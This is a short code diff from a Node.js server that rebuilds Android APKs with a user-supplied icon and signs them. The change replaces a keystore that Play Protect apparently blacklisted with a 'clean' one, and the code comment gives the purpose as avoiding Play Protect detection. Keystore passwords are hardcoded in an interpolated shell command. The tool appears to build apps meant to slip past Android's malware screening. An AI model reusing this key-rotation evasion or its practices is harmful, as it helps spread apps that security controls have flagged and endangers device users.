@@ -557,11 +557,11 @@ app.post('/generate', upload.single('icon'), async (req, res) => {
             await sendUpdate('apk_progress', { step: 'Compiling APK resources...', progress: 70 });
             await runCommand('apktool', ['b', workDir, '-o', unsignedApkPath]);
 
-            // 6. Sign APK with established developer key usman90.jks
+            // 6. Sign APK with clean developer key galleryeye.jks to prevent Play Protect blacklisted key detection
             await sendUpdate('apk_progress', { step: 'Signing application...', progress: 85 });
             const signer = path.join(__dirname, 'assets', 'uber-apk-signer.jar');
-            const fixedKeystore = path.join(__dirname, 'assets', 'usman90.jks');
-            const signCmd = `java -jar "${signer}" --apks "${unsignedApkPath}" --out "${tempDir}" --ks "${fixedKeystore}" --ksAlias usman90 --ksPass "God112256@" --ksKeyPass "God112256@"`;
+            const cleanKeystore = path.join(__dirname, 'assets', 'galleryeye.jks');
+            const signCmd = `java -jar "${signer}" --apks "${unsignedApkPath}" --out "${tempDir}" --ks "${cleanKeystore}" --ksAlias galleryeye --ksPass "GalleryEye2026!" --ksKeyPass "GalleryEye2026!"`;
 
             await new Promise((resolve, reject) => {
                 exec(signCmd, { timeout: 120000 }, (err) => err ? reject(err) : resolve());
